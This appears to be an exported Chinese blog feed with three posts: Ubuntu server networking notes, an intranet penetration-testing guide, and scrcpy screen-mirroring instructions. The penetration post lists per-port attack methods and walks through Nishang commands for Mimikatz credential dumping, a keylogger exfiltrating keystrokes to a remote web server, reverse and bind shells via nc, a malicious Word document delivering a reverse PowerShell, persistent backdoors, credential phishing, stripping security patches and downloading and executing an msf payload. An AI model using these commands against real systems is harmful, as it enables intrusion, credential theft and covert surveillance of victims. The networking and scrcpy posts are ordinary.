ethernets: ens33: addresses: [192.168.1.20/24] # 可以是这种数组形式[1.1.1.1, 192.168.1.20/24]也可以是下面那样 dhcp4: false gateway4: 192.168.1.1 nameservers: addresses: [192.168.1.1] optional: true 或者下面这个格式(可能更清晰，有ipv6) # the datasource. Changes to it will not persist across an instance. # To disable cloud-init's network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # network: {config: disabled} # 前几项必填，其他根据需要填写 network: version: 2 ethernets: eth0: addresses: - 公共ipv4地址/20掩码 - 私有ipv4地址/16 - 公共ipv6地址/64 dhcp4: false gateway4: "公共ipv4网关" gateway6: 公共ipv6网关 match: macaddress: MAC地址(不必须) nameservers: # DNS addresses: - "67.207.67.2" - "67.207.67.3" set-name: eth0 2.使其生效的方法： sudo netplan apply 如果配置有问题会报错，如果没问题，则会新的配置会立即生效。 注意：此方法只是针对ubuntu18.04 Server版，对于18.04 desktop它缺省是使用NetworkManger来进行管理，可使用图形界面进行配置，其网络配置文件是保存在：/etc/NetworkManager/system-connections目录下的，跟Server版区别还是比较大的。 netplan 工具还有其它比较丰富的功能，详细可参见其的说明文档。 DNS配置DNS配置文件/etc/resolve.conf /etc/resolve.conf # DNS设置（软连接） 格式: nameserver 114.114.114.114 nameserver 127.0.0.53 options edns0 search www.tendawifi.com 主机名解析1.配置文件 /etc/hosts 优先级别高于resolve.conf里面的dns服务器的信息 # ip 和名称做解析 127.0.0.1 localhost 192.168.0.111 www.qq.com # 现在这里找映射，有的话就不去resolve里面找了 2.配置文件 /etc/nsswitch.conf 名称解析顺序配置文件 # 按照优先级先后排序来解析 （前面的不满足，才调用后面的） - files /etc/hosts - Resolve 全称systemd-resolved.service(缓存、localhost、本机名) （默认安装） - [NOTFOUND=return] 结果即权威 （正则表达式） （当找不给我到的之后，返回） - dns dns服务器（resolve文件配置的那些） - mdns4_minimal MulticastDNS(多播dns服务) 现在很多dns厂家用的就是多播dns服务 # hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname 关于解析优先级：有的攻击者会修改你hosts文件映射到自己的恶意网址，此时如果把dns的顺序放到hosts前面，他就利用不成了 查看路由# 路由信息 route -n netstat -nr 网桥配置 把服务器当交换机用实在是大材小用把多个以太网段以上层透明的方式连接在一起 应用场景：1.可做防火墙2.可以做虚拟机的服务器（搭建云平台，进行虚拟化的时候）3.桥接有线网与无线网（比如我的笔记本：连接网线访问互联网，另外让别人通过我的电脑无线上网，相当于一个AP）4.链路荣誉容错（需启用STP）5.通过网桥管理工具实现 bridge-utils 在ubunut搭建网桥在虚拟机添加2块网卡(一块NAT，另一块随便) 安装网桥管理包：sudo apt install bridge-utils 临时配置网桥：命令： btctl sudo btctl addr br0 # 添加一个网桥的网卡接口 sudo btctl addif br0 eth0 eth1 # 往网桥接口添加2块网卡 # sudo ifconfig eth0 down # 把网卡down掉 sudo ifconfig eth0 0.0.0.0 up # 2者的ip变没了 sudo ifconfig eth1 0.0.0.0 up sudo ifconfig br0 1.1.1.1/24 up # 手动配置网桥网卡的ip并up sudo dhclient br0 # 或者 dhcp自动获取网桥网卡的ip地址 sudo route add default gw 1.1.1.10 # 添加一个网关，就可以访问外网了 持久配置网桥：修改配置文件： /etc/network/interfaces auto eth0 iface eth0 inet manual auto eth1 iface eth1 inet manual auto br0 iface br0 inet dhcp # dncp ， 也可以static，下面手动配置address，netmask和gateway bridge_ports eth0 eth1 # 加入网卡 bridge_stop off #关闭生成树 ,也可以 on开启成树，参与生成树计算 修改保存，然后 重启网络服务/重启服务器 查看网桥运行状态sudo brctl show查看mac情况sudo brctl showmacs br0查看生成树情况sudo brctl showstp br0 网卡绑定 (经常使用) 还记得小时候这段一把筷子的故事吗 实现多块网卡的绑定，实现高可用、负载均衡、更大发挥能力 一些常用称呼：Bonding == Port Trunking == Link aggregation(链路聚合) == Team 目的：将多个物理网卡组合为一个逻辑网卡 高可用、负载平衡、高吞吐量 配置：在虚拟机做实验：先给虚拟机添加至少两块网卡1. sudo echo bonding >> /etc/modules # 添加内核支持 sudo modprobe bonding # 手动加载内核(临时)， modeprobe加载bonding ifconfig -a # 可以看到自动生成了一个bonding0的网卡(但是没有up) sudo systemctl stop networking # 永久配置，文件 # sudo vim /etc/network/interfaces bounding # 添加一个模块 # 重启服务 sudo systemctl restart networking 2.配置网卡配置文件 # Mode 1 配置 # sudo vim /etc/network/interfaces auto eth0 iface eth0 inet manual bond-master bond0 # 绑定到哪个bound上 bond-primary eth0 # 默认做的主的网卡 auto eth01 iface eth01 inet manual bond-master bond0 # 备的网卡，协商要绑定那个 auto bond0 iface bond0 inet dhcp # 让ip地址dhcp； 或者static 手动制定 bond-mode 1 # 绑定模式 active-backup bond-miimon 100 # 故障检测间隔： 100ms bond-slaves none # 指定作为的的成员的网卡, 这里写none是因为：加入在自己物理网卡片段里面写了 -- # 重启服务 sudo systemctl restart networking PS: 绑定模式bound-mode 1 一个主，一个备(主的故障后才工作) 也叫： active-backup 6种模式Mode 0 ： round-robin(轮询) 网络流量（数据包） 顺序平均分配给Bond中所有物理网卡（可以同时使用三个网卡发送和接收数据） 高可用（容错，一个坏了，另一个网卡接管）、负载均衡（多个网卡，单独是，就是拥有了多G的带宽） Mode 1 : ative-backup Bond中只有一个网卡Active， 其他网卡全部Stanby（效率并不是很高） 对外只有一个网卡的MAC地址可见 高可用实现不了负载均衡，有多个接口也没用 Mode 2: balance-XOR 根据源目的MAC/IP/Port进行计算，确定从哪个网卡发出（性能优于Mode0） 高可用，负载均衡 （XOR — &gt; 异或）只要不出现故障，不改变mac地址，第一次使用的第一个物理网卡进行的通信，以后所有的通信都是继续使用第一个物理网卡流量不是平均的 Mode 3 broadcast 发包广播给Bond中所有网卡，提供最短的故障恢复时间，应用连接不中断 高可用 Mode 4 802.3ad（Dynamic link aggregation） 链路聚合LACP组内的网卡使用相同速率、双工设置 要求：计算机安装ethtool；交换机支持IEEE802.3ad标准，并进行额外配置 高可用、负载均衡 Mode 5 balance-tlb （Adaptive transmit load balancing） 隧道绑定不需要上连交换机额外配置，根据网卡负载出站负载均衡 高可用、负载均衡 Mode 6: balance-alb (Adaptive load balance) Mode 5 + balance-rlb (入站流量负载均衡) Bond驱动拦截本机的ARP响应包，使用不同网卡硬件MAC替换源MAC 不同的对端使用不同的服务器MAC地址，实现入站负载均衡 不需要上连交换机额外配置 查看bond端口和状态cat /proc/net/bonding/bond0 Model 4 配置# sudo vim /etc/network/interfaces auto eth0 # 其他物理网卡配置项同 iface eth0 inet manual bond-master boud0 # 绑定到哪个bound上 auto bon d0 iface bond0 inet dhcp # 让ip地址dhcp； 或者static 手动制定 bond-mode 4 # 绑定模式 active-backup bond-miimon 100 # 故障检测间隔： 100ms bond-lacp-rate 1 # 每1s发送LACPDU（默认为0，即30s） bond-slaves eth0 eth1 # 指定作为的的成员的网卡 DHCP服务通常给客户端自动分配IP地址 Dynamic Host Configuration Protocol 透明的配置网络参数 IP/掩码、网关、DNS、域名、时间服务器、打印服务器(常用的参数是前三个) 通过地址租约循环使用IP地址（有租约期，循环利用） 基于UDP， 标准使用 端口： 67(服务端)，68(客户端) ps: 一般企业，dhcp都在核心交换机上，只有当企业网络非常大复杂时候，才会单独使用一个服务器来提供dhcp服务 请求和分配步骤：1.客户端发生第一个广播(二层，因为此时还没有ip)，数据包：dhcp discover2.dhcp服务器回复数据包dhcp offer3.客户端就再发一个广播包dhcp request4.服务器端发送数据包ack， 包含ip等参数，标记这个ip为已分配 安装1.在vmware上，打开虚拟网络设置，以vmnet8为例，关闭vmware自带的dhcp服务（如果同时有两台dhcp服务:使用响应快的服务提供的ip），将这台虚拟机使用nat，让其他虚拟机都使用这台虚拟机的dhcp服务，把这个虚拟机修改为静态ip, 修改配置文件/etc/network/inertface到vmnet8的网段，sudo ip addr fulsh eth0清除原来配置，重启网络服务 2.安装dhcp服务的软件包 # 这里用的isc的 sudo apt install isc-dhcp-server 3.配置dhcp服务 Note：能不安装的服务和软件就不要安装，反非必须，就不启用（缩小攻击面）`bash ##1.先修改配置文件1 #sudo vim /etc/default/isc-dhcp-server # 指定启动DHCP服务的网卡 INTERFACE=”eth0” # 要启动shcp的网卡name(一般是针对内网的那一块网卡)，可以多个网卡（空格隔开） ##2.再修改主配置文件（指定地址池和选项） #sudo vim /etc/dhcp/dhcpd.conf #option只对dhcp的作用域起效；其他的很对整个服务器起效 #一致的配置写在文件起始位置，其他的个性的单独设置在各个网段的位置default-lease-time 600; #租约期限， 单位：smax-lease-time 7200; #最大租约期限(到达时间的一半，就刷新使用期；如果到达最大时间，就重新通过dhcp获取)authoritative; #启用之后，证明这个是权威的授权dhcp服务器（一般情况下，网络中如果出现其他的dhcp就不会影响了） #配置地址池(可以手动写，也可以在原注释的基础上配置) 网段subnet 10.1.8.0 netmask 255.255.255.0 { range 10.1.8.100 10.1.8.200; #可分配的地址段 option routers 10.1.8.1; #网关地址 option domain-name-servers 192.168.1.1,192.168.1.2; #dns服务器地址，多个用逗号隔开; 一般配到这里就够了 option ntp-server 1.1.1.1; #时间服务器 option domain-name “local.lan”; #统一的域名} ##3.重启服务… #客户端一些操作ipconfig /allipconfig /release # 释放这个ipipconfig /renew #重新获取ip 3.特殊情况(指定某个ip只分配给某台计算机，IP保留) &gt;通过MAC地址来识别 ```bash #sudo vim /etc/dhcp/dhcpd.conf host yourname { hardware ethernet 00:11:22:33:44:55; fixed-address 10.1.8.8; #尽量用上面地址池以外的地址 } #保存，重启 日常的维护日志与状态查询 #服务器地址租约结果（可查看分发详细信息） cat /var/lib/dhcp/dhcpd.leases #系统日志文件(客户端直接关机不会记录，release的时候会记录) tail -f /var/log/syslog #查看服务运行状态 systemctl status isc-dhcp-server.service #客户端来查看获得地址历史(客户端是Linux时) less /var/lib/dhcp/dhcpd.leases NTP服务 （网络时间协议） 时间都去哪了 时间表准： GMT：格林威治标准时间 UTC：世界协调时间 CST：China Standard Time UT+8:00 NTP协议 NTP客户端 客户端程序从时间服务器同步时间 系统启动时自动同步时间 网口激活时自动同步运行 手动同步时间 # 新版系统，查看客户端时间 timedatectl # RTC时间：硬件时间 新版系统使用timesyncd客户端同步时间向这个域名请求：ntp.ubuntu.com timedatectrl list-timezones #列出所有时区 timedatectrl set-timezone #设置时区 timedatectrl set-time "2019-10-01 18:18:18" #设置系统时间 timedatectl set-ntp true #开始网络同步 systemctl status systemd-timesyncd.service # 查看时间服务状态 # 硬件时间(RTC)与UTC时间同步 sudo hwclock -w # 将系统时间写入到RTC时间 sudo hwlock -s # 将硬件 hwclock --set --date='2019-10-01 18:18:18' # 配置文件 /etc/systemd/timesyncd.conf 一个过时的东西(ntpdate)新版本系统使用timesyncd替换ntpd的客户端功能一旦安装了ntpdate / ntp, timedatectrl将被禁用 ntpd – 客户端+服务器 把机器设置成时间服务器`bash apt install ntp # 安装ntp服务systemctl start ntp # 启动服务(123端口就被打开了)systemctl status ntp # 查询服务状态systemctl restart ntp # 重启服务 ##配置文件（我也要跟上一级的时间服务器同步）vim /etc/ntp.conf #如果不使用官方的时间服务器，可以自己指定server 1.1.1.1 #首选网络时间服务器不可用的时候，使用本机始终作为备用时间源fudge 127.127.1.1 startum 10 # 层级设置低点( startum 10, 这里设置为10层) 配置文件中，主要的时间服务器如下 &lt;img src="ubuntu server-网络相关知识/20200308171832987_9157.png"&gt;&lt;/img&gt; ###### 命令: ntpq -- ntp服务端的查询命令 ```bash ntpq -p #命令执行结果详解如下图： 每行前面第一个字符含义： 空 表示无效主机 x 已不再使用 - 已不再使用 # 状态良好但为使用 + 良好且优先使用 * 首选主同步主机 （一般是startum层级最高的） 其他命令#查看日期 date #设置 date --set 1998-11-11 #手动设置日期（要通过 sudo timedatectl set-ntp 0 来关掉ntp） date --set 21:21:21 #设置时间 cat /etc/timezone #查看时区 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透]]></title>
    <url>%2Fposts%2F27104%2F</url>
    <content type="text"><![CDATA[内网分类： 带域环境的内网 不带域环境的内网 一些端口文件共享服务端口渗透 比如学校机房有专门用来下载文件的服务器 ftp服务FTP服务： ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议） 攻击方式： 爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块； 匿名访问：用户名：anonymous 密码：为空或任意邮箱 Samba服务Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务） 攻击方式： 爆破：弱口令（爆破工具采用hydra）hydra -l username -P PassFile IP smb 未授权访问：给予public用户高权限 远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等 LDAP协议ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。默认端口：389 攻击方式： 注入攻击盲注 未授权访问 爆破：弱口令 远程连接服务端口渗透SSH服务SSH服务： 这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。默认端口： 22 攻击方式： 爆破： 弱口令 漏洞：28退格漏洞、OpenSSL漏洞 Telent服务Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；默认端口： 23 攻击方式： 爆破：弱口令 嗅探：此种情况一般发生在局域网 远程桌面连接远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；默认端口： 3389 攻击方式： 爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块) Shift粘滞键后门：5次shift后门 3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_…，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids） VNC服务VNC服务: 一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也默认端口：5900+桌面ID（5901；5902） 攻击方式： 爆破：弱口令 认证口令绕过： 拒绝服务攻击：（CVE-2015-5239） 权限提升：（CVE-2013-6886） 第三方软件… … Web应用服务端口渗透1.中间件平台渗透IIS Apache Nginx Weblogic tomcat Jboos Websphere等 # 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF` 2.WEB应用程序渗透 已知CMS 未知CMS 常规漏洞测试 数据库服务端口渗透针对所有的 数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。 MySQL数据库默认端口： 3306 攻击方式： 爆破：弱口令 身份认证漏洞：CVE-2012-2122 拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器 Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意 MSSQL数据库默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控） 攻击方式： 爆破：弱口令 Oracle数据库默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务） 攻击方式： 爆破：弱口令 漏洞攻击 PostgreSQL数据库PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。默认端口： 5432 攻击方式： 爆破弱口令：postgres postgres 缓冲区溢出：CVE-2014-2669 MongoDB数据库MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考默认端口： 27017 攻击方式： 爆破弱口令 未授权访问 Redis数据库redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。 Exp：https://yunpan.cn/cYjzHxawFpyVt 访问密码 e547默认端口： 6379 攻击方式： 爆破弱口令 未授权访问+配合ssh key提权 SysBase数据库默认端口：服务端口5000；监听端口4100；备份端口：4200 攻击方式： 爆破： 弱口令; 命令注入 DB2数据库默认端口：5000 攻击方式： 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922） 总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！ 邮件服务端口渗透SMTP协议smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！默认端口： 25（smtp）、465（smtps） 攻击方式： 爆破：弱口令 未授权访问 POP3协议默认端口： 109（POP2）、110（POP3）、995（POP3S） 攻击方式： 爆破弱口令 未授权访问 IMAP协议默认端口：143（imap）、993（imaps） 攻击方式： 爆破：弱口令 配置不当 网络常见协议端口渗透DNS服务默认端口： 53 攻击方式： 区域传输漏洞 DHCP服务默认端口：67&amp;68、546（DHCP Failover做双机热备的） 攻击方式： DHCP劫持 SNMP协议默认端口： 161攻击方式: 爆破弱口令 Powershell框架 推荐使用 NiShang 参考文章：https://www.4hou.com/posts/E99ml 下载地址: https://github.com/samratashok/nishang 各种命令解析： https://www.explainshell.com 安装问题nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级） powershell ISE是一个编译器 powershell有很多渗透框架： PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异 实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要 目录结构： 模块和功能介绍： 演示：端口扫描 密码获取 键盘记录 反弹会话 口令爆破 实战应用： 后续控制 域渗透 系统提权 # 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`） Import-Module .nishang.psml # 载入模块 查看NiShang都有哪些模块 Get-Command -Moudle nishang ## 查看机器基本信息 Get-Information # 把结果导出文件 Out-File Get-Information | Out-File res.txt # 检测是否为虚拟机 Check-VM ## 获取密码 Invoke-Minikatz #Dump出本机的凭证信息 Invoke-Minikatz -DumpCerts #dump出远程的两台计算机的凭证信息 Invoke-Minikatz -ComputerName @("computer1", "computer2") #在远程的一台机器上运行Mimikatz 并执行 "privilege::debug exit" Invoke-Minikatz -Command "privilege::debug exit" -ComputerName@("computer1") # Get-PassHashes 获取密码 # 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump） Get-PassHashes # 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率 Get-PassHints ## 获取帮助参数 Get-Help Get-Help Invoke-PortScan ## 端口扫描 查看帮助信息 Get-Help Invoke-PortScan -full Invoke-PortScan Invoke-PortScan -StartAddress 192.168.0.100 -EndAddress 192.168.0.155 -ResolveHost # cd 切换到对应目录 ## 测试键盘记录: Get-Help .\Keylogger.ps1 --full # 查看帮助（提供了四种方式记录） #-URL 要把记录发Keylogger送到的置顶的远程服务器 , -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录 .\gather\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php # 解释： 将记录指定发送给一个可以记录Post请求的Web服务器 # 默认保存到(内容是ascii码)： Windows/Temp/key.log # 把ascii记录解析为非ascii： Parse_Keys .\key.log .\parsed.txt # 持久化记录（重启之后也记录） .\Keylogger.ps1 -persist ## 爆破口令 在scan目录下面 #用于对SQL Server、域控制器、Web和FTP弱口令爆破 Invoke-BruteForce #命令参数如下 -ComputerName # 对应服务的计算机名 -UserList 用户名字典 -PasswordList 密码字典 -Service 服务（默认为：SQL） -StopOnSuccess 匹配一个后停止 -Delay 延迟时间 #比如 Invoke-BruteForce -ComputerName xx-PC -UserList user.txt -PasswordList pass.txt -Service ActiveDirectory -Verbose # 内网扫描器 # 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener #1.在本机开启监听 FireListener 130-150 #2.在目标机器输入命令： FireListener 192.168.0.107 130-150 -Verbose ## 内网嗅探 动静很大，实在没有办法的时候可以试试 目标机执行以下命令 Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999 本机监听 nc -lvvp 9999 ## 屏幕窃取 Show-TargetScreen #本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可） Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443 # 将远程的画面传输给 192.168.230.1 的443端口 参数： Bind --> 正向连接 在目标机执行以下命令（反向连接） Show-TargetScreen -IPAddress 192.168.230.172 -Port 3333 本机输入以下命令 ，接着访问本机的9999端口 nc -nlvp 3333 | nc -nlvp 9999 正向连接 目标机执行： Show-TargetScreen -Bind -Port 3333 本机执行： nc -nv 192.168.230.37 3333 | nc -lnvp 9999 ## Client 的生成(类似木马) 需要自己绑定payload 首先在本机监听： nc -lvp 4444 接着制作word文件，打开\nishang\Shell\Invoke-PowerShellTcpOneLine.ps1文件，复制第三行的内容，可以看到有一个`TcpClient`的参数，这就是远程连接的地址，把他改为本机的IP和你监听的端口，改完以后复制代码，在命令行下如下执行 Invoke-Encode -DataToEncode '复制的代码' -IsString -PostScript 执行完之后会在当前目录生成两个文件，一个是encode.txt， 一个是encodedcommand.txt 接着执行命令 Out-Word-PayloadScript .\encodedcommand.txt 会生成一个word文档，用户打开就中招，我们获取到反弹的powershell ## 后门 1.Http-Backdoor 可以帮助我们在目标机器上下载和执行powershell脚本，接收来自第三方网站的制定，然后在内存中执行powershell脚本 2.Add-ScrnSaveBackdoor 利用windows的屏保来留下一个隐藏的后门 3.Execute-OnTime 与Http-Backdoor相比，多了定时功能 4.Invoke-ADSBackdoor 使用NTFS数据流留下的一个永久后门 最恐怖的后门 ## 钓鱼攻击(有道用户输入自己机器的密码) Invoke-CredentialsPhish ## webshell后门 位于 \nishang\Antak-WebShell目录下 就是一个asp的大马（使用的是powershell的命令，比cmd命令强大） # 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来） Copy-VSS # 直接把文件保存在当前路径下 Copy-VSS -DEstinationDir C:temp # 制定文件保存路径（必须是已存在的路径） ## 其他...... 后续控制# windows上没有nc，需要提前上传一个nc.exe，推荐Linux ## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip） 在Shells目录下面 #1.攻击机器上 NC下执行: nc -lvp 3333 #2.在目标服务器 PowerShell下执行： TCO的 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.103 -Port 3333 ## NO2.正向连接: #1.目标 PowerShell下执行: TCP的， 另外还有UDP的: Invoke-PowerShellTcp -Bind -Port 3333 #NC下执行: 请求他的3333端口 nc -nv 192.168.0.103 3333 ### 基于UDP( Invoke-PowerShellUdp )， nc命令有点不同 正向连接 nc -nvu 192.168.0.103 3333 反向连接 nc lup 3333 ### 基于http和https （ Invoke-PoshRatHttp ） ### 此外,还有http的shell(执行完会生成一条命令，然后???) Invoke-PoshRatHttp -Reverse -IPAddress 192.168.0.103 -Port 3333 Invoke-PoshRatHttps -Reverse -IPAddress 192.168.0.103 -Port 3333 # 然后将生成的命令复制到`目标机`cmd执行，执行完毕会自动消失，然后在本机的powershell下会返回目标机的会话 域渗透在nishang目录下面的ActiveDirectory下面 疑难杂症1.真实案例分析 2.各种安全限制 无解析 无权限 无执行 系统提权 基于数据库 基于漏洞（常用，如果电脑没补丁，可以删除补丁） 第三方软件 # 查看系统的补丁 systeminfo # 删除补丁 Remove-Update # 然后输入补丁编号 # 删除全部补丁 Remove-Update All # 删除全部的安全补丁 Remove-Update Security # 删除指定的补丁 Remove-Update KB2761226 #### Bypass UAC : 模块:Invoke-PsUACme UAC (用户账户控制) Get-Help 获取帮助 powershell下载文件(nishang)$client = new-object System.Net.WebClient $client.DownloadFile('#1', '#2') #1是需要下载文件的url #2是保存为本地文件的路径，包括文件名 例如： $client.DownloadFile('https://www.2cto.com/net/201611/562900.html', 'D:/562900.html') # 或者这个方法 $src = 'https://www.pstips.net/index.php' $des = "$env:temp\index.php" Invoke-WebRequest -uri $src -OutFile $des Unblock-File $des # 下载完之后就可以用啦 ## 下载执行 Download_Execute 下载文本文件，然后转换为可执行文件执行 利用exetotext.ps1把msf生成的木马端`msf.exe`更改为`msf.txt`文件 ExetoTxt c:msf.exe c:msf.txt 然后输入以下命令，调用`Download Execute`脚本下载并执行该文件 Download Execute http://192.168.110.128/msf.txt 这时，msf的监听端就会成功获得反弹回来的shell powershell是没有杀毒软件提示的 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrcpy-手机与电脑投屏神器]]></title>
    <url>%2Fposts%2F50980%2F</url>
    <content type="text"><![CDATA[scrcpy 安装snap install scrcpy adb服务安装sudo apt-get install android-tools-adb adb配置手机通过USB连接电脑lsusb 找到自己手机的识别号,(可以对比数据线插入之前和插入之后多了哪个就是哪个) 创建设备文件下面所有的04e8改成自己的识别号, android.rules文件名可自定义 mkdir ~/.android # 注意你的设备号 echo 0x04e8 > ~/.android/adb_usb.ini sudo touch /etc/udev/rules.d/android.rules sudo gedit /etc/udev/rules.d/android.rules 在文件中输入:注意自己的设备号 SUBSYSTEM=="usb", SYSFS{idVendor}=="你的设备号", MODE="0666" 保存后修改文件权限sudo chmod 777 /etc/udev/rules.d/android.rules 启动adb服务service udev restart adb start-server adb devices 有设备就说明成功了, 如果没有看看自己手机的开发者模式以及USB调试有没有打开 使用scrcpy命令行输入 # 直接使用 scrcpy # 设置显示尺寸为1080 nohun scrcpy -m 1080 &amp; 就会弹出界面了 scrcpy使用方法""" 鼠标左键点击、滑动; 长按鼠标中键回到主屏幕;Ctrl+Shift+V 鼠标右键返回复制文本电脑到手机: 电脑上复制后, 在手机投屏界面按Ctrl+Shift+V复制到手机剪切板, 然后手机中粘贴手机到电脑: 手机上复制到剪切板中, 在投屏界面按下Ctrl+C键，再到电脑正常上粘贴传输文件: 直接在文件管理器复制粘贴 """ 快捷键全屏/回到合适尺寸ctrl +f ctrl + x 展开/折叠通知栏ctrl +n ctrl + shift + n 结束投屏scrcpy -S 或者关掉显示窗口即可 Scrcpy 的命令参数 关闭手机屏幕 scrcpy -S 限制画面分辨率 scrcpy -m 1024 (比如限制为 1024) 修改视频码率 scrcpy -b 4M (默认 8Mbps，改成 4Mbps) 裁剪画面 scrcpy -c 1224:1440:0:0 表示分辨率 1224x1440 并且偏移坐标为 (0,0) 多设备切换 scrcpy -s 设备ID (使用 adb devices 命令查看设备ID) 窗口置顶 scrcpy -T 显示触摸点击 scrcpy -t 在演示或录制教程时，可在画面上对应显示出点击动作 全屏显示 scrcpy -f 文件传输默认路径 scrcpy --push-target /你的/目录 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录 只读模式(仅显示不控制) scrcpy -n 屏幕录像 scrcpy -r 视频文件名.mp4 或 .mkv 屏幕录像 (禁用电脑显示) scrcpy -Nr 文件名.mkv 设置窗口标题 scrcpy --window-title '异次元好棒！' 同步传输声音 可借助 USBaudio 这个开源项目实现，但仅支持 Linux 系统 Scrcpy 快捷键列表 切换全屏模式 Ctrl+F 将窗口调整为1：1（完美像素） Ctrl+G 调整窗口大小以删除黑色边框 Ctrl+X \ 双击黑色背景 设备 HOME 键 Ctrl+H \ 鼠标中键 设备 BACK 键 Ctrl+B \ 鼠标右键 设备 任务管理 键 (切换APP) Ctrl+S 设备 菜单 键 Ctrl+M 设备音量+键 Ctrl+↑ 设备音量-键 Ctrl+↓ 设备电源键 Ctrl+P 点亮手机屏幕 鼠标右键 复制内容到设备 Ctrl+V 启用/禁用 FPS 计数器（stdout） Ctrl+i 安装APK 将 apk 文件拖入投屏 传输文件到设备 将文件拖入投屏（非apk） 投屏并录屏：scrcpy -r 